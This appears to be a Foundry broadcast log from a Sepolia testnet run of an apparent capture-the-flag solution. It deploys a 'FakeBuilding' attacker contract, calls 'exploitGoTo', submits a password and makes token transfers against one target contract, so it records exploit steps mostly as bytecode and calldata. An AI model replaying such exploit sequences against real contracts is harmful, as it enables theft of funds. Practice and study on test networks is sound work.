{
  "transactions": [
    {
      "hash": "0x21645833ef17c4c9d615d3ec3686c2b30e57545d8950ee3b15d275e48f4dc040",
      "transactionType": "CREATE",
      "contractName": "FakeBuilding",
      "contractAddress": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "function": null,
      "arguments": [
        "0x9D29D33d4329640e96cC259E141838EB3EB2f1d9",
        "0x3964D0011EB003488Ab59B1ce0C235baA3998bdd"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "gas": "0x3fd57",
        "value": "0x0",
        "input": "0x60806040526000805460ff60a01b1916600160a01b17905534801561002357600080fd5b506040516102603803806102608339818101604052604081101561004657600080fd5b508051602090910151600080546001600160a01b039384166001600160a01b031991821617909155600180549390921692169190911790556101d38061008d6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806340a3d2461461005c57806348eb76ee146100785780635f9a4bca1461009c57806389862c20146100b9578063aa65c649146100c1575b600080fd5b6100646100e0565b604080519115158252519081900360200190f35b6100806100f0565b604080516001600160a01b039092168252519081900360200190f35b610064600480360360208110156100b257600080fd5b50356100ff565b61008061012b565b6100de600480360360208110156100d757600080fd5b503561013a565b005b600054600160a01b900460ff1681565b6001546001600160a01b031681565b6000805460ff600160a01b808304821615810260ff60a01b199093169290921792839055910416919050565b6000546001600160a01b031681565b6000805460408051633b669c4d60e21b81526004810185905290516001600160a01b039092169263ed9a71349260248084019382900301818387803b15801561018257600080fd5b505af1158015610196573d6000803e3d6000fd5b505050505056fea26469706673582212208f00a2895714d8b3dfc7221e35564417018159120e3841029fd9a4636721046d64736f6c634300070000330000000000000000000000009d29d33d4329640e96cc259e141838eb3eb2f1d90000000000000000000000003964d0011eb003488ab59b1ce0c235baa3998bdd",
        "nonce": "0xbb",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x51166108b8f88749ba36ee70fd95aa80c5a2ca8a91630a717a2ee783e7d03532",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "contribute()",
      "arguments": [],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x10d13",
        "value": "0x3328b944c4000",
        "input": "0xd7bb99ba",
        "nonce": "0xbc",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xfeeb0f089a8da9e01386419025733dbded511a4b78bc2da199a5cbb16b6004e1",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "contribute()",
      "arguments": [],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0xbb37",
        "value": "0x5af3107a4000",
        "input": "0xd7bb99ba",
        "nonce": "0xbd",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x398a88421f13da853a418d8abdb934c491e369d3b6163d7fc616a59be0f55f17",
      "transactionType": "CALL",
      "contractName": "FakeBuilding",
      "contractAddress": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "function": "isLastFloor(uint256)",
      "arguments": [
        "1"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x240dc71e73645d21d805bf6219b84d7432387d81",
        "gas": "0x8f5e",
        "value": "0x0",
        "input": "0x5f9a4bca0000000000000000000000000000000000000000000000000000000000000001",
        "nonce": "0xbe",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xfb4e5b21fbf12a0c59b807202d266f069fca5ac46d346f701159d1a4c9db6935",
      "transactionType": "CALL",
      "contractName": "FakeBuilding",
      "contractAddress": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "function": "exploitGoTo(uint256)",
      "arguments": [
        "1"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x240dc71e73645d21d805bf6219b84d7432387d81",
        "gas": "0xb018",
        "value": "0x0",
        "input": "0xaa65c6490000000000000000000000000000000000000000000000000000000000000001",
        "nonce": "0xbf",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x06c9b6b2c0ad98f8ee9accc2890f98ee0cecca63a237eac18d33ac69fea3f801",
      "transactionType": "CALL",
      "contractName": "FakeBuilding",
      "contractAddress": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "function": "exploitGoTo(uint256)",
      "arguments": [
        "6"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x240dc71e73645d21d805bf6219b84d7432387d81",
        "gas": "0x287b8",
        "value": "0x0",
        "input": "0xaa65c6490000000000000000000000000000000000000000000000000000000000000006",
        "nonce": "0xc0",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xe2fb8d7700164f99a2e9975478879a222651025dcc760928fa423b5ae33c4c3e",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "sendPassword(bytes32)",
      "arguments": [
        "0xde241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x1220d",
        "value": "0x0",
        "input": "0x5c8d2c38de241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8",
        "nonce": "0xc1",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x4bb7b1f67ca714abb966d93c77861267f1670a31b2ad41a19292387cdcc23865",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x5b73C5498c1E3b4dbA84de0F1833c4a029d90519",
        "10000"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x207c1",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000005b73c5498c1e3b4dba84de0f1833c4a029d905190000000000000000000000000000000000000000000000000000000000002710",
        "nonce": "0xc2",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x10a8580af57166447a4d0ae94708318638cf93d0b679d01bce4e20117f8bdc7c",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3964D0011EB003488Ab59B1ce0C235baA3998bdd",
        "1"
      ],
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x9d1a",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003964d0011eb003488ab59b1ce0c235baa3998bdd0000000000000000000000000000000000000000000000000000000000000001",
        "nonce": "0xc3",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xd02255f4f6ef2271925257b702e6377f545c36d6f25503da393a13b217e01592",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x11e83",
        "value": "0x38d7ea4c68000",
        "input": "0x",
        "nonce": "0xc4",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x58a845",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x21645833ef17c4c9d615d3ec3686c2b30e57545d8950ee3b15d275e48f4dc040",
      "transactionIndex": "0x2d",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x311d0",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": null,
      "contractAddress": "0x240dc71e73645d21d805bf6219b84d7432387d81"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x596b14",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x51166108b8f88749ba36ee70fd95aa80c5a2ca8a91630a717a2ee783e7d03532",
      "transactionIndex": "0x2e",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0xc2cf",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x59eb17",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xfeeb0f089a8da9e01386419025733dbded511a4b78bc2da199a5cbb16b6004e1",
      "transactionIndex": "0x2f",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x8003",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5a52e4",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x398a88421f13da853a418d8abdb934c491e369d3b6163d7fc616a59be0f55f17",
      "transactionIndex": "0x30",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x67cd",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5ad262",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xfb4e5b21fbf12a0c59b807202d266f069fca5ac46d346f701159d1a4c9db6935",
      "transactionIndex": "0x31",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x7f7e",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5ca752",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x06c9b6b2c0ad98f8ee9accc2890f98ee0cecca63a237eac18d33ac69fea3f801",
      "transactionIndex": "0x32",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x1d4f0",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x240dc71e73645d21d805bf6219b84d7432387d81",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5d7951",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xe2fb8d7700164f99a2e9975478879a222651025dcc760928fa423b5ae33c4c3e",
      "transactionIndex": "0x33",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0xd1ff",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5ef19d",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x4bb7b1f67ca714abb966d93c77861267f1670a31b2ad41a19292387cdcc23865",
      "transactionIndex": "0x34",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x1784c",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x5f635b",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x10a8580af57166447a4d0ae94708318638cf93d0b679d01bce4e20117f8bdc7c",
      "transactionIndex": "0x35",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0x71be",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x6032ca",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xd02255f4f6ef2271925257b702e6377f545c36d6f25503da393a13b217e01592",
      "transactionIndex": "0x36",
      "blockHash": "0x3b5c845208ced9e1f6914d38cdfbf989cd027c95f88b7d3ab5b13c78c727c0c3",
      "blockNumber": "0x60faba",
      "gasUsed": "0xcf6f",
      "effectiveGasPrice": "0x619008435",
      "from": "0x3964d0011eb003488ab59b1ce0c235baa3998bdd",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1721643904,
  "chain": 11155111,
  "commit": "d9103e9"
}